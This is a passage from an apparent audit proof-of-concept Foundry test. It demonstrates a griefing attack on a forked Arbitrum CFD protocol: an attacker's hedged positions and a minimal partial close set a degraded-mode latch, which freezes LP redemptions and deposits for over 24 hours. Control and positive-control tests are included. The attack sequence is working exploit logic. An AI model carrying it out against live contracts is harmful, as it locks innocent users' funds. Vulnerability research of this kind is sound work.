        uint256 aliceUsdgBefore = IERC20(USDG).balanceOf(alice);
        uint256 bobUsdgBefore = IERC20(USDG).balanceOf(bob);
        console.log("alice redeem request (Junior shares)", lp.aliceShares);
        console.log("alice redeem request value (USDG 1e6)", lp.aliceAssets);
        console.log("bob deposit request (USDG 1e6)", BOB_DEPOSIT);

        // Step 2: the attacker funds two own accounts (4% of pool depth each) and opens an equal LONG/SHORT hedge up
        //         to the solvency admission limit, so the pool sits at marginal solvency (E ~= L + B).
        Hedge memory h = _buildHedge();
        console.log("hedge size per leg (units 1e18)", h.sizePerLeg / 1e18);
        console.log("attacker funding, both accounts (USDG 1e6)", h.funded);
        console.log("[hedged] E", h.E);
        console.log("[hedged] L", h.L);

        // Step 3: the basket moves -0.8% (USD strengthens) so the LONG leg wins.
        _refreshMark(BPS_DOWN);

        // Step 4: the attacker closes the smallest fraction of the winning leg that tips the engine into degraded mode
        //         (the engine sets the latch exactly when its effective assets < max liability, i.e. E < L).
        uint256 k = _minLatchingClose(h);
        OrderV3Types.ExecutionResult memory r = _trade(atkLong, CfdTypes.Side.LONG, k * 1e20, 0, true, BPS_DOWN);
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "latching close executed");
        assertTrue(engine.degradedMode(), "degradedMode latched by a partial winning close");
        assertLt(_E(), _L(), "E < L at the latch");
        console.log("winning-leg units closed to latch", k * 100);
        console.log("[latch] E", _E());
        console.log("[latch] L", _L());

        // Step 5: the attacker closes the losing leg (SHORT) in full. Raw solvency is restored (E >= L + B) and there is
        //         free cash that would fund Alice's redemption, yet the latch persists.
        r = _trade(atkShort, CfdTypes.Side.SHORT, h.sizePerLeg, 0, true, BPS_DOWN);
        assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "losing leg closed");
        assertTrue(engine.degradedMode(), "latch persists after the losing leg is closed");
        {
            uint256 lBound = _L();
            uint256 bBound = _B(lBound);
            assertGe(_E(), lBound + bBound, "raw solvency restored: E >= L + B");
            assertGe(pool.getSettlementFreeAssets(), lp.aliceAssets, "free cash would fund Alice's matured redemption");
            console.log("[restored] E", _E());
            console.log("[restored] L", lBound);
            console.log("[restored] B", bBound);
            console.log("[restored] free settlement assets", pool.getSettlementFreeAssets());
        }

        // Step 6: the attacker closes the winning remainder and is flat, still before the LP requests mature.
        (uint256 szLong,,,,,,) = engine.positions(atkLong);
        if (szLong != 0) {
            r = _trade(atkLong, CfdTypes.Side.LONG, szLong, 0, true, BPS_DOWN);
            assertEq(uint256(r.status), uint256(OrderV3Types.LifecycleStatus.Executed), "winning remainder closed");
        }
        assertEq(_sizeOf(atkLong), 0, "attacker LONG account flat");
        assertEq(_sizeOf(atkShort), 0, "attacker SHORT account flat");
        assertTrue(engine.degradedMode(), "latch persists while the attacker is flat and the pool is solvent");
        assertLt(junior.currentLpEpoch(), lp.aliceRequestId, "attack done before the LP requests mature");
        uint256 attackerLeft = _bal(atkLong) + _bal(atkShort);
        int256 attackerSpend = int256(h.funded) - int256(attackerLeft);
        console.log("attacker balance after the unwind (USDG 1e6)", attackerLeft);
        console.log("attacker net spend (USDG 1e6)", attackerSpend);
        console.log("[flat] E", _E());
        console.log("[flat] L", _L());
        console.log("[flat] free settlement assets", pool.getSettlementFreeAssets());

        // Step 7: the LP requests mature. First, directly at maturity, both permissionless settle routes revert on
        //         the latch and neither victim can self-rescue. Then, for a full 24 h, an honest keeper does
        //         everything permissionless it can every hour -- refresh the mark, settle (both routes), clear the
        //         latch -- issued low-level so their outcome is ignored. On the deployed code every attempt is
        //         rejected and the freeze holds; a mitigation that let restored solvency re-open settlement would
        //         fund Alice and activate Bob inside this loop, flipping the damage asserts after it.
        uint64 matured = uint64(pool.lpEpochStart(lp.aliceRequestId) + 30);
        _advance(matured);
        assertTrue(engine.degradedMode(), "still latched when the requests mature");

        // Route 1 (permissionless keeper settle via the Router) and Route 2 (direct permissionless HousePool settle)
        // both revert HousePool__DegradedMode. The latch is still set here under any mitigation that does not
        // auto-clear, so this demonstration is stable across the fix check.
        _refreshMark(BASE);
        vm.expectRevert(IF033Errors.HousePool__DegradedMode.selector);
        vm.prank(keeper);
        keeperRouter.settleLpEpoch{value: pythFee}(_payload(BASE, cur, cur - 1));
        vm.expectRevert(IF033Errors.HousePool__DegradedMode.selector);
        vm.prank(keeper);
        IPoolDirectSettleF033(POOL).settleLpEpoch(0, 0);

        // Neither victim can self-rescue: a matured redeem request cannot be cancelled, and an active deposit epoch
        // cannot be cancelled. Both reverts are epoch-based (TrancheVault.sol:894 / :851), independent of the latch.
        vm.expectRevert(IF033Errors.TrancheVault__RedeemCancellationUnavailable.selector);
        vm.prank(alice);
        junior.cancelRedeemRequest(lp.aliceRequestId, alice, alice);
        vm.expectRevert(IF033Errors.TrancheVault__DepositEpochAlreadyActive.selector);
        vm.prank(bob);
        junior.cancelPendingDeposit(lp.bobRequestId, bob, bob);

        for (uint256 i = 1; i <= 24; ++i) {
            _advance(uint64(matured + i * 3600));
            if (!IOracleF033(ORACLE).isOracleFrozen()) {
                _refreshMark(BASE);
                vm.prank(keeper); // Route 1: permissionless settle via the Router
                (bool s1,) = ROUTER.call{value: pythFee}(
                    abi.encodeWithSelector(IPerpsKeeper.settleLpEpoch.selector, _payload(BASE, cur, cur - 1))
                );
                s1; // ignored: reverts on the deployed code, would succeed under a solvency-reopening fix
            }
            vm.prank(keeper); // Route 2: direct permissionless HousePool settle
            (bool s2,) = POOL.call(
                abi.encodeWithSelector(IPoolDirectSettleF033.settleLpEpoch.selector, uint256(0), uint256(0))
            );
            s2;
            vm.prank(keeper); // any keeper tries to clear the latch (onlyOwner on the deployed code, CfdEngine.sol:658)
            (bool c,) = ENGINE.call(abi.encodeWithSelector(IEngineF033.clearDegradedMode.selector));
            c;
        }
        uint256 frozenFor = cur - pool.lpEpochStart(lp.aliceRequestId);
        assertGe(frozenFor, 24 hours, "freeze sustained for at least 24 h after maturity");
        console.log("seconds since the LP requests matured", frozenFor);

        // Damage after >= 24 h: Alice's matured redemption is unpaid and Bob's matured deposit is unactivated.
        assertEq(IERC20(USDG).balanceOf(alice), aliceUsdgBefore, "alice received no USDG for 24 h");
        assertEq(junior.maxRedeem(alice), 0, "alice has nothing claimable for 24 h");
        assertEq(
            junior.pendingRedeemRequest(lp.aliceRequestId, alice), lp.aliceShares, "alice's matured redemption unfunded"
        );
        assertEq(junior.pendingDepositRequest(lp.bobRequestId, bob), BOB_DEPOSIT, "bob's 100k USDG still escrowed");
        assertEq(junior.claimableDepositShares(lp.bobRequestId, bob), 0, "bob's matured deposit never activated");
        assertEq(IERC20(USDG).balanceOf(bob), bobUsdgBefore, "bob got no USDG back for 24 h");
        uint256 frozenUsdg = lp.aliceAssets + BOB_DEPOSIT;
        console.log("frozen LP USDG for >= 24 h (alice redeem + bob deposit)", frozenUsdg);
        if (attackerSpend > 0) {
            console.log("frozen / attacker net spend", frozenUsdg / uint256(attackerSpend));
        }

        // Step 8 (positive control): ONLY the owner can lift the latch; right after, the same keeper settle funds
        //         Alice's redemption and activates Bob's deposit. The latch was the sole cause of the freeze.
        vm.prank(OWNER);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "owner cleared the latch");
        _refreshMark(BASE);
        vm.prank(keeper);
        keeperRouter.settleLpEpoch{value: pythFee}(_payload(BASE, cur, cur - 1));
        uint256 claimable = junior.maxRedeem(alice);
        assertEq(claimable, lp.aliceShares, "after the owner clear, alice's whole request is funded");
        vm.prank(alice);
        uint256 paid = junior.redeem(claimable, alice, alice);
        assertGt(IERC20(USDG).balanceOf(alice), aliceUsdgBefore, "alice paid once the owner cleared");
        assertGt(junior.claimableDepositShares(lp.bobRequestId, bob), 0, "bob's deposit activates once cleared");
        console.log("after the owner clear: alice paid (USDG 1e6)", paid);
    }

    /// Control: the same LP flow with no attack. At maturity a keeper settles, Alice's redemption is paid and Bob's
    /// deposit activates. Must PASS with and without the fix.
    function test_F033_control() public {
        uint256 e0 = _epoch0();
        Lp memory lp = _lpSetup(e0);
        _advance(uint64(pool.lpEpochStart(lp.aliceRequestId) + 30));
        _settle(BASE);
        assertFalse(engine.degradedMode(), "control: no latch");
        uint256 claimable = junior.maxRedeem(alice);
        assertEq(claimable, lp.aliceShares, "control: alice's matured request funded at maturity");
        vm.prank(alice);
        uint256 paid = junior.redeem(claimable, alice, alice);
        assertGt(paid, 0, "control: alice paid");
        assertEq(IERC20(USDG).balanceOf(alice), paid, "control: alice holds the paid USDG");
        assertGt(junior.claimableDepositShares(lp.bobRequestId, bob), 0, "control: bob's deposit activated");
        console.log("control: alice paid at maturity (USDG 1e6)", paid);
    }

    // ------------------------------------------------------------------ scenario steps

    /// @dev `cur` (not `block.timestamp`): solc may rematerialize `block.timestamp` after a `vm.warp`.
    function _epoch0() internal view returns (uint256) {
        return cur / 3600;
    }

    /// @dev Alice: deposit request -> activation -> claim -> redeem request in epoch e0+2 (id e0+3). Bob: deposit
    ///      request in epoch e0+2 (id e0+3). Both mature when epoch e0+3 starts.
    function _lpSetup(uint256 e0) internal returns (Lp memory lp) {
        // (a) Alice (a fresh Junior LP) requests a deposit.
        _lpDeposit(alice, ALICE_DEPOSIT);

        // (b) next LP epoch: any keeper settles (activates Alice's deposit); she claims her shares.
        _advance(uint64(pool.lpEpochStart(e0 + 1) + 30));
        _settle(BASE);
        vm.prank(alice);
        lp.aliceShares = junior.deposit(ALICE_DEPOSIT, alice);

        // (c) one epoch later (past the 1 h share cooldown) Alice asks to redeem everything: request id e0+3.
        _advance(uint64(pool.lpEpochStart(e0 + 2) + 40));
        vm.prank(alice);
        lp.aliceRequestId = junior.requestRedeem(lp.aliceShares, alice, alice);
        lp.aliceAssets = junior.convertToAssets(lp.aliceShares);

        // (d) Bob (a fresh Junior LP) requests a deposit in the same epoch: request id e0+3.
        _advance(cur + 20);
        lp.bobRequestId = _lpDeposit(bob, BOB_DEPOSIT);
        assertEq(lp.aliceRequestId, e0 + 3, "alice request id");
        assertEq(lp.bobRequestId, e0 + 3, "bob request id");
    }

    function _lpDeposit(address lp, uint256 assets) internal returns (uint256 requestId) {
        deal(USDG, lp, assets);
        vm.startPrank(lp);
        IERC20(USDG).approve(JUNIOR_VAULT, assets);
        requestId = junior.requestDeposit(assets, lp);
        vm.stopPrank();
    }

    function _settle(uint256 basketBps) internal {
        vm.prank(keeper);
        keeperRouter.settleLpEpoch{value: pythFee}(_payload(basketBps, cur, cur - 1));
    }

    function _refreshMark(uint256 basketBps) internal {
        _advance(cur + 2);
        vm.prank(refresher);
        routerViews.updateMarkPrice{value: pythFee}(_payload(basketBps, cur, cur - 1));
    }

    // ---- accounting views (E, L, B as defined in SECURITY.md invariants)
    function _E() internal view returns (uint256) {
        uint256 p = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return p > c ? p - c : 0;
    }

    function _L() internal view returns (uint256) {
        (uint256 longMax,,,) = engine.sides(0);
        (uint256 shortMax,,,) = engine.sides(1);
        return longMax > shortMax ? longMax : shortMax;
    }

    function _B(uint256 l) internal view returns (uint256) {
        return (l * engine.settlementBufferBps() + 9_999) / 10_000;
    }

    function _bal(address a) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a);
    }

    function _sizeOf(address a) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(a);
    }

    // ---- trading
    function _fundTrader(address acct, uint256 amount) internal {
        deal(USDG, acct, amount);
        vm.startPrank(acct);
        IERC20(USDG).approve(CLEARINGHOUSE, amount);
        clearinghouse.depositFor(acct, amount);
        vm.stopPrank();
    }

    function _bounds() internal view returns (OrderV3Types.ExecutionBounds memory) {
        uint256 window = routerViews.maxExecutionWindowSeconds();
        return OrderV3Types.ExecutionBounds({
            submitBy: uint64(cur + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: lifecycle.currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _request(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose)
        internal
        returns (OrderV3Types.OrderRequest memory)
    {
        bool longSide = side == CfdTypes.Side.LONG;
        // LONG: open accepts price >= target, close accepts price <= target. SHORT: the opposite (OrderValidationLib).
        uint256 target = isClose ? (longSide ? type(uint256).max : 1) : (longSide ? 1 : type(uint256).max);
        return OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("F033", ++orderNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: isClose,
            bounds: _bounds()
        });
    }

    /// @dev Commit as `acct`, then a keeper fills it at the next tick with the basket at `bps`. `committed` is false
    ///      when the Router rejects the commit itself (predictably invalid open).
    function _tryTrade(address acct, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 bps)
        internal
        returns (bool committed, OrderV3Types.ExecutionResult memory r)
    {
        OrderV3Types.OrderRequest memory req = _request(side, size, margin, isClose);
        vm.prank(acct);
        (bool ok, bytes memory ret) = ROUTER.call(abi.encodeCall(IPerpsTraderActions.commitOrder, (req)));
        if (!ok) {
            return (false, r);
        }
        uint64 id = abi.decode(ret, (uint64));
        uint64 t = cur;
        _advance(t + 3);
        vm.prank(keeper);
        r = keeperRouter.executeOrder{value: 2 * pythFee}(id, _payload(bps, t + 1, t));
        committed = true;
    }

    function _trade(address acct, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 bps)
        internal
        returns (OrderV3Types.ExecutionResult memory r)
    {
        bool committed;
        (committed, r) = _tryTrade(acct, side, size, margin, isClose, bps);
        assertTrue(committed, "order commit rejected");
    }

    function _quantize(uint256 size) internal pure returns (uint256) {
        return size / 1e20 * 1e20;
    }

    /// @dev Smallest LONG (winning leg) close, in size quanta, after which `degradedMode` is set. Each probe is rolled back.
    function _minLatchingClose(Hedge memory h) internal returns (uint256) {
        uint256 qHi = h.sizePerLeg / 1e20;
        uint256 qLo = 0; // does not latch
        uint256 snap = vm.snapshotState();
        _trade(atkLong, CfdTypes.Side.LONG, qHi * 1e20, 0, true, BPS_DOWN);
        bool full = engine.degradedMode();
        _rewind(snap);
        assertTrue(full, "closing the whole winning leg latches");
        while (qHi - qLo > 1) {
            uint256 mid = (qLo + qHi) / 2;
            snap = vm.snapshotState();
            _trade(atkLong, CfdTypes.Side.LONG, mid * 1e20, 0, true, BPS_DOWN);
            bool latched = engine.degradedMode();
            _rewind(snap);
            if (latched) qHi = mid;
            else qLo = mid;
        }
        return qHi;
    }

    /// @dev Opens equal-sized LONG (atkLong) and SHORT (atkShort) legs in alternating chunks under the skew cap until
    ///      the next chunk would breach E >= L + B.
    function _buildHedge() internal returns (Hedge memory h) {
        _refreshMark(BASE);
        h.p0 = engine.lastMarkPrice();
        uint256 depth = _E();
        // The attacker funds both accounts with 4% of depth each (margin, fees, VPI, the losing leg's loss).
        uint256 perAccount = depth * FUNDING_PCT / 100;
        _fundTrader(atkLong, perAccount);
        _fundTrader(atkShort, perAccount);
        h.funded = 2 * perAccount;
        // Chunk: 38% of depth in notional, under the 40% skew cap (maxSkewRatio 0.4).
        uint256 hi = _quantize(depth * 38 / 100 * 1e20 / h.p0);
        while (hi >= 1e20) {
            // Largest pair (equal LONG + SHORT size) that still opens: bisect in size quanta; each probe is rolled back.
            uint256 lo = _largestPair(hi);
            if (lo == 0) break;
            bool ok = _tryPair(lo);
            assertTrue(ok, "pair that fit in the probe must open");
            h.sizePerLeg += lo;
            hi = lo; // later pairs are never larger than the previous one (capacity only shrinks)
        }
        h.E = _E();
        h.L = _L();
    }

    /// @dev Binary search for the largest pair size <= `hi` whose SHORT leg still opens (E >= L + B after it). The
    ///      smallest legal open is the Router's 1,000 USDG minimum notional. Each probe is rolled back.
    function _largestPair(uint256 hi) internal returns (uint256) {
        uint256 qHi = hi / 1e20; // known (or assumed) to fail above this
        uint256 qMin = (1_000e6 * 1e20 / engine.lastMarkPrice() + 1e20 - 1) / 1e20 + 1; // min notional + 1 quantum slack
        uint256 snap = vm.snapshotState();
        bool ok = _tryPair(qHi * 1e20);
        _rewind(snap);
        if (ok) return qHi * 1e20;
        snap = vm.snapshotState();
        ok = _tryPair(qMin * 1e20);
        _rewind(snap);
        if (!ok) return 0;
        uint256 qLo = qMin; // fits
        while (qHi - qLo > 1) {
            uint256 mid = (qLo + qHi) / 2;
            snap = vm.snapshotState();
            ok = _tryPair(mid * 1e20);
            _rewind(snap);
            if (ok) qLo = mid;
            else qHi = mid;
        }
        return qLo * 1e20;
    }

    function _tryPair(uint256 size) internal returns (bool ok) {
        uint256 margin = size * engine.lastMarkPrice() / 1e20 * 8 / 1000; // 0.8% of the chunk's notional as position margin
        bool committed;
        OrderV3Types.ExecutionResult memory r;
        (committed, r) = _tryTrade(atkLong, CfdTypes.Side.LONG, size, margin, false, BASE);
        if (!committed || r.status != OrderV3Types.LifecycleStatus.Executed) return false;
        (committed, r) = _tryTrade(atkShort, CfdTypes.Side.SHORT, size, margin, false, BASE);
        if (!committed || r.status != OrderV3Types.LifecycleStatus.Executed) return false;
        return true;
    }

    // ------------------------------------------------------------------ helpers

    /// @dev Moves time and the L2 block. On an Arbitrum fork `block.number` is the L1 block, and forge serves the
    ///      ArbSys precompile (0x64, out of scope) as the fork's L2 block without following vm.roll. On chain
    ///      arbBlockNumber() advances every L2 block, so the PoC sets it to the rolled L2 height.
    function _advance(uint64 timestamp) internal {
        l2Height += 4 * (timestamp - cur) + 1; // Arbitrum produces ~4 L2 blocks per second
        cur = timestamp;
        vm.warp(timestamp);
        vm.roll(l2Height);
        vm.mockCall(
            address(100), abi.encodeWithSelector(IArbSysBlockF033.arbBlockNumber.selector), abi.encode(l2Height)
        );
    }

    /// @dev Rolls the EVM state back to `snap` and restores the scenario clock (storage `cur` / `l2Height` were reverted
    ///      with it; the block environment and the ArbSys mock were not).
    function _rewind(uint256 snap) internal {
        vm.revertToState(snap);
        vm.warp(cur);
        vm.roll(l2Height);
        vm.mockCall(
            address(100), abi.encodeWithSelector(IArbSysBlockF033.arbBlockNumber.selector), abi.encode(l2Height)
        );
    }

    /// @dev Signed-update stand-in for a live tick at `tick`: the real stored price of each feed at FORK_BLOCK with the
    ///      basket scaled by `basketBps`/10_000: USD-quoted feeds x f, inverted (USD/xxx) feeds x 1/f.
    function _payload(uint256 basketBps, uint64 tick, uint64 prevTick) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            PythStructs.Price memory p = storedAtFork[i];
            uint256 raw = uint256(uint64(p.price));
            uint256 conf = uint256(p.conf);
            if (inverted[i]) {
                raw = raw * BASE / basketBps;
                conf = conf * BASE / basketBps;
            } else {
                raw = raw * basketBps / BASE;
                conf = conf * basketBps / BASE;
            }
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(raw)), conf: uint64(conf), expo: p.expo, publishTime: tick, prevPublishTime: prevTick
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }
}
```
